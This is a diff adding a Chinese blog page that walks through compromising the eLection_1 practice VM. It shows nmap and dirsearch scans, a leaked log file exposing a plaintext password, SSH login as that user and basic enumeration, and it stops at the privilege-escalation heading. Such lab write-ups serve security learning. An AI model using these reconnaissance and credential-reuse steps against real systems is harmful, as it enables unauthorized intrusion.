@@ -1,0 +1,738 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="eLection_1 靶机信息收集123456789101112┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.128 Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-07-11 11:38 EDTNmap scan report for 192.168.56.128Ho">
+<meta property="og:type" content="article">
+<meta property="og:title" content="eLection_1 靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/07/18f5865fb0df.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="eLection_1 靶机信息收集123456789101112┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.128 Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-07-11 11:38 EDTNmap scan report for 192.168.56.128Ho">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/95fc10fc0dfddc51f6a2d833d0ac2ba3_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/bb5383a668f2e29b79f455ad5ec899e2_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/e68b9ea09369e454c649f52503e30a73_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/f0e9ac4a8c53dddd66143177f4aadb1f_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/85297e44f267940b86a6d2e225bb1ba1_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/f95de58820af410b89a425e4e8c9abd0_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/e15a4c0740bf8b666a615aac887d4f30_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/08e7c92edbdc1bbdfe4c25df468ba650_MD5.png">
+<meta property="article:published_time" content="2023-07-12T05:27:42.000Z">
+<meta property="article:modified_time" content="2023-07-15T13:18:18.346Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/95fc10fc0dfddc51f6a2d833d0ac2ba3_MD5.png">
+  
+  
+  
+  <title>eLection_1 靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="eLection_1 靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-07-12 13:27" pubdate>
+          2023年7月12日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          25k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          212 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">eLection_1 靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="eLection-1-靶机"><a href="#eLection-1-靶机" class="headerlink" title="eLection_1 靶机"></a>eLection_1 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.128 <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-11 11:38 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.128<br>Host is up (0.00067s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:FE:C8:1D (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.04 seconds<br></code></pre></td></tr></table></figure>
+
+<p>开放了 22 端口和 80 端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80 192.168.56.128<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-11 11:39 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.128<br>Host is up (0.00052s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)<br>|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)<br>|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br>|_http-title: Apache2 Ubuntu Default Page: It works<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>MAC Address: 08:00:27:FE:C8:1D (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 14.53 seconds<br></code></pre></td></tr></table></figure>
+
+<p>Ubuntu 操作系统，80 端口是 apache 搭建的，首页是 apache2 的默认界面</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p22,80 192.168.56.128 <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-11 11:41 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.128<br>Host is up (0.00054s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-csrf: Couldn&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /robots.txt: Robots file</span><br><span class="hljs-string">|   /phpinfo.php: Possible information file</span><br><span class="hljs-string">|_  /phpmyadmin/: phpMyAdmin</span><br><span class="hljs-string">MAC Address: 08:00:27:FE:C8:1D (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 37.52 seconds</span><br></code></pre></td></tr></table></figure>
+
+<p>漏洞脚本扫描得到了 <code>robots.txt</code>, <code>phpinfo.php</code>, <code>phpmyadmin</code></p>
+<h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>打开 robots.txt 查看，并使用 dirsearch 进行目录爆破。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/eLection_1]<br>└─$ sudo dirsearch -u http://192.168.56.128         <br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    <br> (_||| _) (/_(_|| (_| )                                                                                             <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.168.56.128/_23-07-11_11-46-56.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-07-11_11-46-56.<span class="hljs-built_in">log</span><br><br>Target: http://192.168.56.128/<br><br>[11:46:56] Starting: <br>[11:46:57] 403 -  279B  - /.ht_wsr.txt                                     <br>[11:46:57] 403 -  279B  - /.htaccess.bak1<br>[11:46:57] 403 -  279B  - /.htaccess.save<br>[11:46:57] 403 -  279B  - /.htaccess.sample<br>[11:46:57] 403 -  279B  - /.htaccess.orig<br>[11:46:57] 403 -  279B  - /.htaccessBAK<br>[11:46:57] 403 -  279B  - /.htaccess_sc<br>[11:46:57] 403 -  279B  - /.htaccess_extra<br>[11:46:57] 403 -  279B  - /.htaccessOLD2<br>[11:46:57] 403 -  279B  - /.htaccess_orig<br>[11:46:57] 403 -  279B  - /.htaccessOLD<br>[11:46:57] 403 -  279B  - /.htm                                            <br>[11:46:57] 403 -  279B  - /.html<br>[11:46:57] 403 -  279B  - /.htpasswds<br>[11:46:57] 403 -  279B  - /.htpasswd_test                                  <br>[11:46:57] 403 -  279B  - /.httr-oauth<br>[11:46:58] 403 -  279B  - /.php                                            <br>[11:47:16] 200 -   11KB - /index.html                                       <br>[11:47:16] 301 -  321B  - /javascript  -&gt;  http://192.168.56.128/javascript/<br>[11:47:21] 200 -   13KB - /phpmyadmin/doc/html/index.html                   <br>[11:47:22] 301 -  321B  - /phpmyadmin  -&gt;  http://192.168.56.128/phpmyadmin/<br>[11:47:22] 200 -   94KB - /phpinfo.php                                      <br>[11:47:23] 200 -   10KB - /phpmyadmin/                                      <br>[11:47:23] 200 -   10KB - /phpmyadmin/index.php                             <br>[11:47:25] 200 -   30B  - /robots.txt                                       <br>[11:47:25] 403 -  279B  - /server-status/                                   <br>[11:47:25] 403 -  279B  - /server-status<br></code></pre></td></tr></table></figure>
+
+<p>目录爆破并没有得到有效信息，而 robots.txt 给出了一些看起来可能是目录的东西</p>
+<p><img src="/pic/95fc10fc0dfddc51f6a2d833d0ac2ba3_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>依次手动尝试发现只有 election 目录可以访问</p>
+<p><img src="/pic/bb5383a668f2e29b79f455ad5ec899e2_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>是一个投票系统，提示注册成为 admin,然后在下方输入投票代码，尝试输入了一下发现只有五个字符才会有验证码错误的提示</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">Voter&#x27;s Code is incorrect! Please<span class="hljs-built_in"> check </span>or re-register!<br></code></pre></td></tr></table></figure>
+
+<p>burp 抓包发现</p>
+<p><img src="/pic/e68b9ea09369e454c649f52503e30a73_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>POST 请求发向另一个 php 文件，并且 election 目录下似乎有别的目录，尝试再一次目录爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo dirsearch -u http://192.168.56.128/election/<br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    <br> (_||| _) (/_(_|| (_| )                                                                                             <br>                                                                                                                    <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.168.56.128/-election-_23-07-15_04-29-09.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-07-15_04-29-09.<span class="hljs-built_in">log</span><br><br>Target: http://192.168.56.128/election/<br><br>[04:29:09] Starting: <br>[04:29:09] 301 -  322B  - /election/js  -&gt;  http://192.168.56.128/election/js/<br>[04:29:10] 403 -  279B  - /election/.ht_wsr.txt                            <br>[04:29:10] 403 -  279B  - /election/.htaccess.bak1                         <br>[04:29:10] 403 -  279B  - /election/.htaccess_extra<br>[04:29:10] 403 -  279B  - /election/.htaccess.orig<br>[04:29:10] 403 -  279B  - /election/.htaccess_sc<br>[04:29:10] 403 -  279B  - /election/.htaccess.save<br>[04:29:10] 403 -  279B  - /election/.htaccess_orig<br>[04:29:10] 403 -  279B  - /election/.htaccessOLD2<br>[04:29:11] 403 -  279B  - /election/.htaccessBAK<br>[04:29:11] 403 -  279B  - /election/.htaccess.sample<br>[04:29:11] 403 -  279B  - /election/.html<br>[04:29:11] 403 -  279B  - /election/.htaccessOLD<br>[04:29:11] 403 -  279B  - /election/.htm<br>[04:29:11] 403 -  279B  - /election/.htpasswds                             <br>[04:29:11] 403 -  279B  - /election/.htpasswd_test<br>[04:29:11] 403 -  279B  - /election/.httr-oauth<br>[04:29:11] 403 -  279B  - /election/.php                                   <br>[04:29:16] 301 -  325B  - /election/admin  -&gt;  http://192.168.56.128/election/admin/<br>[04:29:16] 200 -    9KB - /election/admin/?/login                           <br>[04:29:16] 403 -  279B  - /election/admin/.htaccess<br>[04:29:16] 200 -    9KB - /election/admin/                                  <br>[04:29:17] 200 -    9KB - /election/admin/index.php                         <br>[04:29:17] 200 -  985B  - /election/admin/logs/                             <br>[04:29:25] 301 -  324B  - /election/data  -&gt;  http://192.168.56.128/election/data/<br>[04:29:25] 200 -  766B  - /election/data/                                   <br>[04:29:29] 200 -    7KB - /election/index.php                               <br>[04:29:29] 200 -    7KB - /election/index.php/login/                        <br>[04:29:30] 200 -  989B  - /election/js/                                     <br>[04:29:30] 301 -  329B  - /election/languages  -&gt;  http://192.168.56.128/election/languages/<br>[04:29:30] 301 -  323B  - /election/lib  -&gt;  http://192.168.56.128/election/lib/<br>[04:29:30] 200 -  967B  - /election/lib/                                    <br>[04:29:32] 301 -  325B  - /election/media  -&gt;  http://192.168.56.128/election/media/<br>[04:29:32] 200 -    2KB - /election/media/                                  <br>[04:29:41] 200 -  964B  - /election/themes/                                 <br>[04:29:41] 301 -  326B  - /election/themes  -&gt;  http://192.168.56.128/election/themes/<br></code></pre></td></tr></table></figure>
+
+<p>发现了很多目录，尝试访问 <code>admin/index.php</code></p>
+<p><img src="/pic/f0e9ac4a8c53dddd66143177f4aadb1f_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>似乎需要输入 admin 的 id，随便输入了一下，发现提示</p>
+<p><img src="/pic/85297e44f267940b86a6d2e225bb1ba1_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>看来不一定能使用爆破了（后续 burp 抓包发现这是 js 文件根据请求包字段做的限制，其实可以绕过）。再看看别的目录，data 目录</p>
+<p><img src="/pic/f95de58820af410b89a425e4e8c9abd0_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>logs 目录</p>
+<p><img src="/pic/e15a4c0740bf8b666a615aac887d4f30_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="日志文件泄露"><a href="#日志文件泄露" class="headerlink" title="日志文件泄露"></a>日志文件泄露</h2><p>有个日志文件下载下来看看</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[<span class="hljs-number">2020</span><span class="hljs-number">-01</span><span class="hljs-number">-01</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>] Assigned <span class="hljs-keyword">Password</span> <span class="hljs-keyword">for</span> the <span class="hljs-keyword">user</span> love: P@$$<span class="language-pgsql">w0rd@<span class="hljs-number">123</span></span><br><span class="language-pgsql">[<span class="hljs-number">2020</span><span class="hljs-number">-04</span><span class="hljs-number">-03</span> <span class="hljs-number">00</span>:<span class="hljs-number">13</span>:<span class="hljs-number">53</span>] Love added candidate <span class="hljs-string">&#x27;Love&#x27;</span>.</span><br><span class="language-pgsql">[<span class="hljs-number">2020</span><span class="hljs-number">-04</span><span class="hljs-number">-08</span> <span class="hljs-number">19</span>:<span class="hljs-number">26</span>:<span class="hljs-number">34</span>] Love has been <span class="hljs-keyword">logged</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">from</span> <span class="hljs-type">Unknown</span> IP <span class="hljs-keyword">on</span> Firefox (Linux).</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="ssh-登录"><a href="#ssh-登录" class="headerlink" title="ssh 登录"></a>ssh 登录</h2><p>竟然在这里拿到了用户名和密码，尝试 ssh 登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ ssh love@192.168.56.128            <br>love@192.168.56.128\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.3.0-46-generic x86_64)</span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Documentation:  https://help.ubuntu.com</span><br><span class="hljs-string"> * Management:     https://landscape.canonical.com</span><br><span class="hljs-string"> * Support:        https://ubuntu.com/advantage</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Canonical Livepatch is available for installation.</span><br><span class="hljs-string">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="hljs-string">     https://ubuntu.com/livepatch</span><br><span class="hljs-string"></span><br><span class="hljs-string">74 packages can be updated.</span><br><span class="hljs-string">28 updates are security updates.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="hljs-string"></span><br><span class="hljs-string">Your Hardware Enablement Stack (HWE) is supported until April 2023.</span><br><span class="hljs-string">Last login: Fri Jul 14 19:22:22 2023 from 192.168.56.106</span><br><span class="hljs-string">love@election:~$ id</span><br><span class="hljs-string">uid=1000(love) gid=1000(love) groups=1000(love),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)</span><br><span class="hljs-string">love@election:~$ whoami</span><br><span class="hljs-string">love</span><br><span class="hljs-string">love@election:~$ uname -a</span><br><span class="hljs-string">Linux election 5.3.0-46-generic #38~18.04.1-Ubuntu SMP Tue Mar 31 04:17:56 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="hljs-string">love@election:~$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="hljs-string">    link/ether 08:00:27:fe:c8:1d brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.168.56.128/24 brd 192.168.56.255 scope global dynamic noprefixroute enp0s3</span><br><span class="hljs-string">       valid_lft 539sec preferred_lft 539sec</span><br><span class="hljs-string">    inet6 fe80::321e:9192:79f9:852/64 scope link noprefixroute </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">love@election:~$ sudo -l</span><br><span class="hljs-string">[sudo] password for love: </span><br><span class="hljs-string">Sorry, user love may not run sudo on election.</span><br></code></pre></td></tr></table></figure>
+
+<p>基础的信息收集顺便也完成了</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>看看用户家目录</p>
